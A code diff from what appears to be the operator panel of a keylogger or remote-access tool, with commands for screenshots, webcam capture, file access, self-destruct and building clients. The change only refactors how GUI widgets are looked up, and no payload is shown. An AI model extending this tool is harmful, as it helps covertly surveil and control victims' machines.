@@ -4,7 +4,7 @@ from .base import BaseEventHandler
 from server import Server
 from gui import UIManager
 from commands import ScreenshotCommand, WebcamCommand, SelfDestructCommand, FileCommand
-from utils import EventHandlerRegister, AsyncTkinter
+from utils import EventHandlerRegister, AsyncTkinter, WidgetRegistry
 
 
 logger = logging.getLogger(__name__)
@@ -28,8 +28,8 @@ class ButtonHeaderHandler:
     @AsyncTkinter.async_handler
     async def command_create():
         UIManager.render_compile_top_level()
-        btn = UIManager.WINDOW.find('btn_create')
-        btn.builder.widget.config(state='disabled')
+        btn = WidgetRegistry.get('btn_create')
+        btn.config(state='disabled')
 
     @staticmethod
     @EventHandlerRegister.registry('screenshot')
@@ -78,7 +78,7 @@ class ButtonMainHandler:
     def command_refresh():
         logger.info('Refresh Table')
         keyloggers = set(Server().clients.keys())
-        table = UIManager.WINDOW.find('table_keyloggers').builder.widget
+        table = WidgetRegistry.get('table_keyloggers')
         rows = dict(map(lambda item: (tuple(item.values), item.iid), table.get_rows()))
         all_rows = set(rows.keys())
         rows_delete, rows_insert = all_rows - keyloggers, keyloggers - all_rows
